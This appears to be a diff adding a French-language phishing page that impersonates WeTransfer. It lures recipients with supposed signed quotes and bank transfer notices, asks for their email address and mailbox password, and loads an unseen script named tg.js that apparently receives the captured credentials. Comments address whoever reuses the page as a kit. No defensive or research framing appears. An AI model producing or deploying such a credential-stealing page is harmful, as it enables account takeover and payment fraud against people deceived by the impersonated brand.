@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>WeTransfer - Documents Sécurisés</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #fff; /* Fond blanc */
+      color: #000;           /* Texte noir */
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 50px auto;
+      padding: 0 20px;
+      text-align: center;
+    }
+
+    /* Logo WeTransfer */
+    .logo {
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 120px; /* Ajuste la taille selon tes besoins */
+    }
+
+    /* Titre principal */
+    h2 {
+      font-size: 18px;
+      font-weight: normal;
+      margin-bottom: 30px;
+    }
+
+    /* Liste des fichiers */
+    .files {
+      margin-bottom: 30px;
+    }
+    .file-item {
+      margin: 8px 0;
+      font-size: 16px;
+    }
+    .file-item img {
+      vertical-align: middle;
+      width: 24px;
+      margin-right: 8px;
+    }
+
+    /* Texte explicatif */
+    .explanation {
+      margin-bottom: 20px;
+      line-height: 1.4;
+    }
+
+    /* Formulaire */
+    form {
+      display: inline-block;
+      max-width: 300px;
+      width: 100%;
+      text-align: left;
+    }
+    label {
+      display: block;
+      font-weight: bold;
+      margin: 10px 0 5px;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 10px;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+
+    /* Bouton */
+    button {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin-top: 15px;
+      background-color: #000;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #333;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- Logo WeTransfer -->
+  <div class="logo">
+    <!-- Remplace la source de l'image par celle de ton choix -->
+    <img src="https://images.squarespace-cdn.com/content/v1/6786e2320e14800cb602c8f4/9eff5bb6-da2b-4204-8ad0-c53216465ec1/Sans%2Btitre.png?format=1500w" alt="WeTransfer" />
+  </div>
+
+  <!-- Titre principal -->
+  <h2>Vous avez reçu des fichiers sécurisés (Devis signé + Avis d'ordre de virement)</h2>
+
+  <!-- Liste des fichiers -->
+  <div class="files">
+    <div class="file-item">
+      <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF icon" />
+      Devis signé.pdf
+    </div>
+    <div class="file-item">
+      <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF icon" />
+      Avis d'ordre devirement.pdf
+    </div>
+  </div>
+
+  <!-- Texte explicatif -->
+  <p class="explanation">
+    Pour ouvrir les fichiers, veuillez entrer les identifiants de messagerie
+    auxquels ce message a été envoyé.
+  </p>
+
+  <!-- Formulaire -->
+  <form>
+    <label for="email">Adresse e-mail (obligatoire)</label>
+    <input type="email" id="email" name="email" required />
+
+    <label for="password">Mot de passe (obligatoire)</label>
+    <input type="password" id="password" name="password" required />
+
+    <button type="submit">ACCEDER AUX DOCUMENTS</button>
+  </form>
+</div>
+
+<script src="tg.js"></script>
+</body>
+</html>
